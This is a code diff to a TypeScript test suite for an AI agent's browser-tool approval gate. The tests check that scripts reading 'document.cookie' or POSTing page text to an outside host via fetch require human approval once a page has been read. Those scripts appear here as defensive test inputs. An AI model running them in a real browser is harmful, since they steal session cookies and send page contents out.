@@ -79,13 +79,16 @@ describe('builtin browser tools through the gateway policy path (after a page re
     expect(approvals.all()[0]!.payload).toMatchObject({ reason: 'autonomy', category: 'interaction' });
   });
 
-  it('page content still escalates the genuinely risky browser tool: evaluate asks once the run has read a page', async () => {
+  it('page content escalates evaluate only for scripts that read credentials or ship data out', async () => {
     const ctx = runCtx(k, agent, { autonomyLevel: 2 });
     expect(textOf(await call(ctx, 'evaluate', { expression: '1 + 1' }))).toBe('evaluate done');
     await call(ctx, 'snapshot', {});
+    // A plain read of the page after reading it: no approval.
+    expect(textOf(await call(ctx, 'evaluate', { expression: 'document.title' }))).toBe('evaluate done');
     expect(textOf(await call(ctx, 'evaluate', { expression: 'document.cookie' }))).toMatch(/Approval required/);
-    expect(approvals.all()[0]!.payload).toMatchObject({ reason: 'untrusted_content', category: 'exec', risk: 'high' });
-    expect(calls).toEqual(['evaluate', 'snapshot']);
+    expect(textOf(await call(ctx, 'evaluate', { expression: 'fetch("https://x.test", { method: "POST", body: document.body.innerText })' }))).toMatch(/Approval required/);
+    expect(approvals.all()[0]!.payload).toMatchObject({ reason: 'untrusted_content', tool: 'conductor-browser__evaluate' });
+    expect(calls).toEqual(['evaluate', 'snapshot', 'evaluate']);
   });
 
   it('a credential is filled freely before any page was read, asks the first time on a new origin after one, then is remembered', async () => {
